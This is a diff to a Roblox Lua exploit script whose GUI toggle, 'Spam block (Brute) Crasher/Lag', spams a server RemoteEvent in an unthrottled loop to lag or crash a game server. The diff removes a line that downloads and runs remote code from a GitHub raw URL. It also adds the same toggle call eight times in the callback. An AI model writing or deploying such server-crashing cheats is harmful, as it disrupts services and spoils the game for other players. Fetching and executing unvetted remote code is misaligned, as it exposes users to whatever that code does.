@@ -1011,7 +1011,10 @@ _G.SpamBlock = true
 
 function SpamBlock()
     while _G.SpamBlock == true do
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Yield1111/Crash/refs/heads/main/Brute"))()  
+        local ohBoolean1 = true
+
+    game:GetService("ReplicatedStorage").Events.Zombie.Block:FireServer(ohBoolean1)
+local ohBoolean1 = true  
         wait(0)
     end
 end
@@ -1022,6 +1025,20 @@ sections.Section1:AddToggle({
     text = "Spam block (Brute) Crasher/Lag",
     flag = "Toggle_1",
     callback = function(v)
+        _G.SpamBlock  = v
+        SpamBlock()
+        _G.SpamBlock  = v
+        SpamBlock()
+        _G.SpamBlock  = v
+        SpamBlock()
+        _G.SpamBlock  = v
+        SpamBlock()
+        _G.SpamBlock  = v
+        SpamBlock()
+        _G.SpamBlock  = v
+        SpamBlock()
+        _G.SpamBlock  = v
+        SpamBlock()
         _G.SpamBlock  = v
         SpamBlock()
     end
